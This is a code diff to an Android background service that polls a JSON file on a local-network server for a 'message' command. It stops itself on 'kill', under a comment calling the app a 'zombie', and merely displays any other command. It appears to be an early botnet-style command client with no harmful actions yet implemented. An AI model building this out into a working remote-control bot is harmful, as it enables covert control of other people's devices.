@@ -15,6 +15,8 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
+import static java.lang.Thread.sleep;
+
 public class Fetcher extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -23,7 +25,18 @@ public class Fetcher extends Service {
         Toast toast = Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT);
         toast.show();
 
-        new JsonTask().execute("http://192.168.1.4:80/test.json");
+        int i = 1;
+        while(i < 5){
+            try{
+                new JsonTask().execute("http://192.168.1.4:80/test.json");
+                sleep(2000);
+                i=i+1;
+            }
+            catch (Exception e){
+                e.printStackTrace();
+                break;
+            }
+        }
 
         return Service.START_NOT_STICKY;
     }
@@ -89,6 +102,7 @@ public class Fetcher extends Service {
                 task = json.getString("message");
                 if(task.equals("kill")){
                     // Terminate zombie
+                    stopSelf();
                 } else {
                     // Functions to be implemented
                     Toast toast = Toast.makeText(getApplicationContext(), task, Toast.LENGTH_SHORT);
